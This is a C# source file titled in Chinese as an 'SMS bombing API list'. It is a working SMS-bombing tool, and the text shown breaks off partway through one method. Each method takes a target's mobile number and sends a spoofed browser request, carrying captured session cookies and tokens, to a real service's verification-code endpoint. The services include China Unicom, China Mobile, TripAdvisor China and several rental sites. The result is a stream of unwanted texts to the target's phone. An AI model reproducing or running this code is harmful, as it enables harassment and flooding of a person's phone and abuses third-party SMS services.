using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace SMSBoooooM
{
    /// <summary>
    /// 短信轰炸API列表
    /// 
    /// </summary>
    public class SMSAPI
    {
        #region Common
        private string mobile;

        private HttpWebResponse response;
        public SMSAPI(string mobile)
        {
            this.mobile = mobile;
        }

        private string ResponseStr(HttpWebResponse response)
        {
            var msg = "";
            try
            {
                Stream receiveStream = response.GetResponseStream();
                var readStream = new StreamReader(receiveStream, Encoding.UTF8);
                msg = readStream.ReadToEnd();
                readStream.Close();
                response.Close();
            }
            catch (Exception ex)
            {
                msg = ex.Message;
            }
            return msg;
        }

        #endregion

        #region 5G预约_10010

        [IsAPI("联通5G预约")]
        public string SMS_5G()
        {
            Request_m_client_10010_com(out response);
            return ResponseStr(response);
        }

        private bool Request_m_client_10010_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://m.client.10010.com/fiveGOrder/fiveGOrder/getVerificationCode.do");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"http://m.client.10010.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; U; Android 9; zh-cn; Mi Note 3 Build/PKQ1.181007.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/11.0.6";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://m.client.10010.com/fiveGOrder/fiveGOrder/orderInit.do";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"fiveGOrder=98705c4b799d113cc5e5d5e20ffe4ace; JSESSIONID=F45ACAA68755B09D2AA0CEF224FC40F9; mobileService1=caBn2863XYhfn8K1NblAeEWL_8rvIESK1EZg52wTMYk-_zG01bqZ!1504281042; c_sfbm=234g_00; ecs_acc=; req_mobile=; req_serial=; req_wheel=ssss; clientid=98|0");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format("phone={0}", mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        #region 猫途鹰注册
        [IsAPI("猫途鹰注册")]
        public string SMS_MTY()
        {
            Request_www_tripadvisor_cn(out response);
            return ResponseStr(response);
        }

        private bool Request_www_tripadvisor_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.tripadvisor.cn/MemberPhoneVerification");

                request.KeepAlive = true;
                request.Headers.Add("X-Puid", @"XaAIlsCoASkABan0HWEAAAFt");
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://www.tripadvisor.cn");
                request.Headers.Add("X-Requested-By", @"TNI1625!ADKiP6c2y1Sqs4PtvZ/r6t0ysewgbe0O2NiO/QsLyrB5Vs0fvQdXEYrxlKa2+xJjme9A/l7kMQ/6lphgCPQ9KYNm5+ZpziTXZSQwtM2lvbCZoyG88gr3bV9lW1zsKN314+Jk5OmTL5D0UfGPJE0+EPmRZmmUo/MrrQnL2vWHFVaL");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "*/*";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.tripadvisor.cn/RegistrationController?flow=core_combined&pid=40487&locationId=1&requireSecure=false&forceDesktop=false&hideNavigation=true&flowOrigin=join&social=false";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"ServerPool=A; VRMCID=%1%V1*id.12019*llp.%2F*e.1571373839075; TART=%1%enc%3A3FQY2Chn6hr6xLQS3pjaq8pBDQR9fzkw2TDYuZz0fnoDBwf9%2BQ0n3LSLYdh6eSx9h%2BgvrP5ao%2BQ%3D; TATravelInfo=V2*A.2*MG.-1*HP.2*FL.3*RS.1; TAUnique=%1%enc%3AMLeIT5uyD5YhMcTQ9FIRE02rO8NUywvlhfwsUUjySTQ2jHwltRJPGQ%3D%3D; TASSK=enc%3AADkrjMohw1cRyIz2C9WQWM77CoAaNdW1OBgCb1lk%2FkbhVV10lXNq2blHgPVf869qQ%2Ffy5yzTAgC57aTn55UHqofu6TFwSCTb%2BlZkbB%2FijUSQ6YTT9xUnlEKSLcuUHKWhgg%3D%3D; CM=%1%PremiumMobSess%2C%2C-1%7Ct4b-pc%2C%2C-1%7CRestAds%2FRPers%2C%2C-1%7CRCPers%2C%2C-1%7CWShadeSeen%2C%2C-1%7CTheForkMCCPers%2C%2C-1%7CHomeASess%2C1%2C-1%7CPremiumSURPers%2C%2C-1%7CPremiumMCSess%2C%2C-1%7CRestPremRSess%2C%2C-1%7CCCSess%2C%2C-1%7CCYLSess%2C%2C-1%7CPremRetPers%2C%2C-1%7CViatorMCPers%2C%2C-1%7Csesssticker%2C%2C-1%7CPremiumORSess%2C%2C-1%7Ct4b-sc%2C%2C-1%7CRestAdsPers%2C%2C-1%7CMC_IB_UPSELL_IB_LOGOS2%2C%2C-1%7Cb2bmcpers%2C%2C-1%7CRestWiFiPers%2C%2C-1%7CPremMCBtmSess%2C%2C-1%7CPremiumSURSess%2C%2C-1%7CMC_IB_UPSELL_IB_LOGOS%2C%2C-1%7CLaFourchette+Banners%2C%2C-1%7Csess_rev%2C%2C-1%7Csessamex%2C%2C-1%7CPremiumRRSess%2C%2C-1%7CTADORSess%2C%2C-1%7CAdsRetPers%2C%2C-1%7CTARSWBPers%2C%2C-1%7CSPMCSess%2C%2C-1%7CTheForkORSess%2C%2C-1%7CTheForkRRSess%2C%2C-1%7Cpers_rev%2C%2C-1%7CRestWiFiREXPers%2C%2C-1%7CSPMCWBPers%2C%2C-1%7CRBAPers%2C%2C-1%7CRestAds%2FRSess%2C%2C-1%7CHomeAPers%2C%2C-1%7CPremiumMobPers%2C%2C-1%7CRCSess%2C%2C-1%7CWiFiORSess%2C%2C-1%7CLaFourchette+MC+Banners%2C%2C-1%7CRestAdsCCSess%2C%2C-1%7CRestPremRPers%2C%2C-1%7Csh%2C%2C-1%7Cpssamex%2C%2C-1%7CTheForkMCCSess%2C%2C-1%7CCYLPers%2C%2C-1%7CCCPers%2C%2C-1%7Cb2bmcsess%2C%2C-1%7CRestWiFiSess%2C%2C-1%7CRestWiFiREXSess%2C%2C-1%7CSPMCPers%2C%2C-1%7CPremRetSess%2C%2C-1%7CViatorMCSess%2C%2C-1%7CPremiumMCPers%2C%2C-1%7CAdsRetSess%2C%2C-1%7CPremiumRRPers%2C%2C-1%7CRestAdsCCPers%2C%2C-1%7CTADORPers%2C%2C-1%7CTheForkORPers%2C%2C-1%7CWiFiORPers%2C%2C-1%7CPremMCBtmPers%2C%2C-1%7CTheForkRRPers%2C%2C-1%7CTARSWBSess%2C%2C-1%7CPremiumORPers%2C%2C-1%7CRestAdsSess%2C%2C-1%7CRBASess%2C%2C-1%7CSPORPers%2C%2C-1%7Cperssticker%2C%2C-1%7CSPMCWBSess%2C%2C-1%7C; TAReturnTo=%1%%2F; roybatty=TNI1625!ANUMMAzGuwbXXT6t0%2FLRGbl9bxQoAf9a28b1D1nzki3wI2psO2pDSX%2BllxAnLHxAg4IwNm%2FLYVBnClanxHyJL2MHINzQw%2F5cr7mWmBXydMDWYJrQdkAca%2BDh%2BaB%2Fu4yYDrwqMjrl%2ByRCsZq8AH4MmUn4efi6xY7lm4VYIY5FInxY%2C1; _gcl_au=1.1.81167890.1570769045; _ga=GA1.2.1479335099.1570769045; _gid=GA1.2.2100861605.1570769045; _gat_UA-79743238-4=1; SRT=%1%enc%3A3FQY2Chn6hr6xLQS3pjaq8pBDQR9fzkw2TDYuZz0fnoDBwf9%2BQ0n3LSLYdh6eSx9h%2BgvrP5ao%2BQ%3D; __gads=ID=3928be5802c75cd6:T=1570769051:S=ALNI_MYD0qaFZ2N39poG5hs2z45TbCIm_w; TASession=%1%V2ID.9B2D3F5645A15CE90F7C80B2BC40CFF7*SQ.6*MC.12019*LR.https%3A%2F%2Fwww%5C.baidu%5C.com%2Fs%3Fwd%3D%25E6%2597%2585%25E6%25B8%25B8%25E7%25BD%2591%26pn%3D10%26oq%3D%25E6%2597%2585%25E6%25B8%25B8%25E7%25BD%2591%26ie%3Dutf-8%26usm%3D1%26rsv_pq%3Def02fbee002f79ef%26rsv_t%3D744fMM%252BIrIn6Ck7oucQ%252FLMyrpnX%252FgtSesRBhWR9PT8AWJUWQHSNtQEjTHYU*LP.%2F*LS.DemandLoadAjax*GR.12*TCPAR.13*TBR.27*EXEX.17*ABTR.62*PHTB.96*FS.15*CPU.23*HS.recommended*ES.popularity*DS.5*SAS.popularity*FPS.oldFirst*FA.1*DF.0*TRA.true; TAUD=LA-1570769040270-1*RDD-1-2019_10_11*LG-12025-2.1.F.*LD-12026-.....");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format("countryCode=86&phoneNumber={0}", mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 玫瑰里注册

        [IsAPI("玫瑰里注册")]
        public string SMS_MGL()
        {
            Request_www_lavin_com_cn(out response);
            return ResponseStr(response);
        }
        private bool Request_www_lavin_com_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://www.lavin.com.cn/portal/index/sendRegister");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"http://www.lavin.com.cn");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://www.lavin.com.cn/user/register";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"PHPSESSID=d2ac70sop2r7egu7bi2gr9faig; Hm_lvt_12cf124592d99b7fb0ad22e6604d04db=1570777257; nb-referrer-hostname=www.lavin.com.cn; Hm_lpvt_12cf124592d99b7fb0ad22e6604d04db=1570777271; nb-start-page-url=http%3A%2F%2Fwww.lavin.com.cn%2Fuser%2Fregister");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format(@"phone={0}&template=SMS_152505627", mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        # region 移动实名

        [IsAPI("移动实名")]
        public string SMS_YD()
        {
            Request_smz_cmcc_cs_cn_30026(out response);
            return ResponseStr(response);
        }
        private bool Request_smz_cmcc_cs_cn_30026(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://smz.cmcc-cs.cn:30026/edcreg/weChatRegist/getProvCode");

                request.KeepAlive = true;
                request.Accept = "text/plain, */*; q=0.01";
                request.Headers.Add("Origin", @"https://smz.cmcc-cs.cn:30026");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; Android 9; Mi Note 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044904 Mobile Safari/537.36 MMWEBID/7747 MicroMessenger/7.0.6.1500(0x2700063E) Process/tools NetType/4G Language/zh_CN";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "https://smz.cmcc-cs.cn:30026/edcreg-web/videorealname/wechatRegister/ph-realname.html?requestSource=000002&transactionID=00000220150428193030100001";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"JSESSIONID=51AF4FC6AA074D50066B5189F34BE2A6");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"transactionId=108520191011153508424020&billId=" + mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        #region 移动套餐1
        [IsAPI("移动套餐1")]
        public string SMS_YD2()
        {
            Request_pcweb_mmarket_com(out response);
            return ResponseStr(response);
        }
        private bool Request_pcweb_mmarket_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://pcweb.mmarket.com/MobileAss/api/adjustCode.html?sid=16A61043B9D7F66E29E68656D2BEC995&tag=1&mobile=" + mobile);

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Linux; Android 9; Mi Note 3 Build/PKQ1.181007.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044904 Mobile Safari/537.36 MMWEBID/7747 MicroMessenger/7.0.6.1500(0x2700063E) Process/tools NetType/4G Language/zh_CN";
                request.Referer = "http://pcweb.mmarket.com/MobileAss/acti/freegdjh.html?param=776022e9b80c9fd4b9cff33673eb7e9c635ba5ae2b4f7cad2b1df8ab078c4cacf15d77f8602279b32249a490cd5a449a7c18af30a91639a5aeb61ef286371f9337efede37f9a6a6e59bbed1126c73ddca172c9e1963b660b898d648ffcc30446f2acca548fd7f3642c53ce954948c851";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,en-US;q=0.9");
                request.Headers.Set(HttpRequestHeader.Cookie, @"JSESSIONID=16A61043B9D7F66E29E68656D2BEC995; udata_account_300011877320=qWPzYRZmON4l6cQEkz7oIjL2M9VqYkHHb8eP6Sn2Q%2Fs%3D; userid_300011877320=1570784108832597653; udata_s_300011877320=1570784108851166459; udata_lt_300011877320=1570784108854494554");

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        #region 点点租
        [IsAPI("点点租")]
        public string SMS_DDZ()
        {
            Request_sh_diandianzu_com(out response);
            return ResponseStr(response);
        }
        private bool Request_sh_diandianzu_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://sh.diandianzu.com/sms/sendverifysms/");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://sh.diandianzu.com");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://sh.diandianzu.com/";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"ddz_home_web_client_token=fbcf32cfe60e4100dd00bee31b45cebe; Hm_lvt_1bcd4e3218b4d173045f59bb8bb0e964=1570788933; _ga=GA1.2.715058571.1570788935; _gid=GA1.2.1391096741.1570788935; _gat_gtag_UA_64529309_1=1; PHPSESSID=fo6adkqf5sdqak1gh1os36qd53; ddz_home_web_goto_city=80; Hm_lpvt_1bcd4e3218b4d173045f59bb8bb0e964=1570788939; Hm_lvt_16e21b470fe13f50e04716219fa9de31=1570788939; Hm_lpvt_16e21b470fe13f50e04716219fa9de31=1570788939");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format(@"mobile={0}&token=a9976769f7321af65c91908bf5f60e47", mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 联通营业厅

        [IsAPI("联通营业厅")]
        public string SMS_UAC()
        {
            Request_uac_10010_com(out response);
            return ResponseStr(response);
        }

        private bool Request_uac_10010_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://uac.10010.com/portal/Service/SendMSG?callback=jQuery17207696755674541829_1570845018041&req_time=1570846384722&_=1570846384722&mobile=" + mobile);

                request.KeepAlive = true;
                request.Accept = "text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01";
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://uac.10010.com/portal/homeLoginNew";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"UM_distinctid=16cbdbabd25504-03cb92995c000f-3c375f0d-1fa400-16cbdbabd2696f; mallcity=71|710; userprocode=071; citycode=710; WT_FPC=id=2c442e041b68183a54a1570844952678:lv=1570844952680:ss=1570844952678; SHOP_PROV_CITY=; _n3fa_cid=bd60b1a2598e4c2df67c792b62fd832c; _n3fa_ext=ft=1570845018; _n3fa_lvt_a9e72dfe4a54a20c3d6e671b3bad01d9=1570845018; _n3fa_lpvt_a9e72dfe4a54a20c3d6e671b3bad01d9=1570845018; unisecid=497216DB783E50BEAF8D1856B07F6935; ckuuid=8c3f948be0291205141c86091c3a8593");

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 移动营业厅

        [IsAPI("移动营业厅")]
        public string SMS_10086Login()
        {
            Request_login_10086_cn(out response);
            return ResponseStr(response);
        }

        private bool Request_login_10086_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://login.10086.cn/sendRandomCodeAction.action");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://login.10086.cn");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("Xa-before", @"29549010334326259306814739739578");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://login.10086.cn/login.html?channelID=12034&backUrl=http%3A%2F%2Fwww.10086.cn%2Findex%2Fhb%2Findex_270_270.html";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"CmLocation=270|270; CmProvid=hb; WT_FPC=id=2ec89303d4751a959ee1570846828374:lv=1570846828745:ss=1570846828374; sendflag=20191012102030757793; CaptchaCode=YeIGCU; rdmdmd5=D98D3C5F6EA5A29937D2C2E0F43E7031; captchatype=z; lgToken=5594deb9d90446028e3b015c44a17a35");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format(@"userName={0}&type=01&channelID=12034", mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 盟享加

        [IsAPI("盟享加")]
        public string SMS_MXJ()
        {
            Request_www_mxj_com_cn(out response);
            return ResponseStr(response);
        }

        private bool Request_www_mxj_com_cn(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://www.mxj.com.cn/login/getRegVerifyCode?token=1529MKTVIj0tOGXtdZnWcHk9VaH9MwDxhMiXcTE5S0Z0eQO0O0OO0O0O");

                request.KeepAlive = true;
                request.Headers.Add("Sec-Fetch-Mode", @"cors");
                request.Headers.Add("Origin", @"https://www.mxj.com.cn");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Accept = "application/json, text/javascript, */*; q=0.01";
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.Headers.Add("DNT", @"1");
                request.Headers.Add("Sec-Fetch-Site", @"same-origin");
                request.Referer = "https://www.mxj.com.cn/login/register.html";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate, br");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"Hm_lvt_19e256084f73045dedb109b7af90c6f4=1570866529; sajssdk_2015_cross_new_user=1; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216dbef10222190-0d572576972a23-5b123211-2073600-16dbef10223846%22%2C%22%24device_id%22%3A%2216dbef10222190-0d572576972a23-5b123211-2073600-16dbef10223846%22%2C%22props%22%3A%7B%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_referrer%22%3A%22https%3A%2F%2Fwww.baidu.com%2Fs%22%2C%22%24latest_referrer_host%22%3A%22www.baidu.com%22%2C%22%24latest_search_keyword%22%3A%22%E5%8A%A0%E7%9B%9F%E7%BD%91%22%7D%7D; Hm_lpvt_19e256084f73045dedb109b7af90c6f4=1570866531");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = @"mobile=" + mobile;
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }

        #endregion

        #region 天府租赁注册

        [IsAPI("天府租赁注册")]
        public string SMS_tfzl()
        {
            Request_www_tffwzl_com(out response);
            return ResponseStr(response);
        }
        private bool Request_www_tffwzl_com(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://www.tffwzl.com/sms/send");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"http://www.tffwzl.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
                request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36";
                request.Headers.Add("DNT", @"1");
                request.ContentType = "application/x-www-form-urlencoded; charset=UTF-8";
                request.Referer = "http://www.tffwzl.com/register";
                request.Headers.Set(HttpRequestHeader.AcceptEncoding, "gzip, deflate");
                request.Headers.Set(HttpRequestHeader.AcceptLanguage, "zh-CN,zh;q=0.9,en;q=0.8");
                request.Headers.Set(HttpRequestHeader.Cookie, @"XSRF-TOKEN=eyJpdiI6Ijc0eXNqd1NOM1wvRWVsQnhOcmQ1am9RPT0iLCJ2YWx1ZSI6IjBBTmVkZVdtWXlFbzh1ZkkwY1JIekdqXC9nQjYzRlhPVm11c0JjcEFYUlJtQlNrY3FXaWdtOUNNQVVrdUhUbUpOWHNhOTFpUzlsSElUT1wvQlVpR1ZEQUE9PSIsIm1hYyI6ImFiZmY2MDk2MjdhOWEyOWQ3MWU2NzEwM2FkMWViNDk1MmM2OTE3ZjRhMjNkOGU5YTUzZWY4NTk0MWUzNDVjOTIifQ%3D%3D; tffwzl_session=eyJpdiI6InFEVEpheGhWcHpPa0ptN3p4NFpxekE9PSIsInZhbHVlIjoiSjU3SFZONWxNa25zTkhFbU5yZU82VFNYc0NONnpPZUVcL0oyU1h5Z01WcCtUdTVvRjZmQ3pEbUtUc2RTdkFjcklsU2VWMFFtUEVkYU5aajJEUmU4RFd3PT0iLCJtYWMiOiJiNWZlMjY3YWMxYjE2MzU0MDFmMTFkNmFjNTFiMGNlNGY4ZWVjMGY1MzBjNDQ2N2MzOTg0OWIzMDE5ZjkxNzcwIn0%3D");

                request.Method = "POST";
                request.ServicePoint.Expect100Continue = false;

                string body = string.Format(@"mobile={0}&type=register", mobile);
                byte[] postBytes = System.Text.Encoding.UTF8.GetBytes(body);
                request.ContentLength = postBytes.Length;
                Stream stream = request.GetRequestStream();
                stream.Write(postBytes, 0, postBytes.Length);
                stream.Close();

                response = (HttpWebResponse)request.GetResponse();
            }
            catch (WebException e)
            {
                if (e.Status == WebExceptionStatus.ProtocolError) response = (HttpWebResponse)e.Response;
                else return false;
            }
            catch (Exception)
            {
                if (response != null) response.Close();
                return false;
            }

            return true;
        }
        #endregion

        #region 天府租赁登陆
        [IsAPI("天府租赁登陆")]
        public string SMS_tfzl2()
        {
            Request_www_tffwzl_com2(out response);
            return ResponseStr(response);
        }
        private bool Request_www_tffwzl_com2(out HttpWebResponse response)
        {
            response = null;

            try
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://www.tffwzl.com/sms/send");

                request.KeepAlive = true;
                request.Accept = "*/*";
                request.Headers.Add("Origin", @"http://www.tffwzl.com");
                request.Headers.Add("X-Requested-With", @"XMLHttpRequest");
